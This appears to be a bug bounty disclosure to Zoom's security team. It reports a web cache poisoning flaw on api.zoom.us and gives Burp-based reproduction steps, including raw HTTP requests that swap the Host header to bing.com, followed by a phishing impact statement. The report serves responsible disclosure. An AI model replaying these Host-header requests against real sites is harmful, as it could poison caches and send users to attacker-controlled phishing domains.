Hello Zoom Security Team,

Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server
and cache so that a harmful HTTP response is served to other users.

I found web cache poisoning in your domain https://api.zoom.us

Steps to Reproduce:
1) Navigate to https://api.zoom.us

2) Go to proxy tool burp, make intercept on & Capture the request
GET / HTTP/1.1
Host: api.zoom.us
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: <removed>
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

3) Change Host to bing.com and forward the request.
GET / HTTP/1.1
Host: bing.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: <removed>
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

5) Now go to the website and click on hyperlinks

6) You will be redirected to bing.com

Impact
This could be used for the phishing attacks. An attacker can set up a Domain which looks similar to
zoom.com and spread this poisoned link via facebook or other forums, fooling users to follow it and 
get redirected to the evil attackers domain.
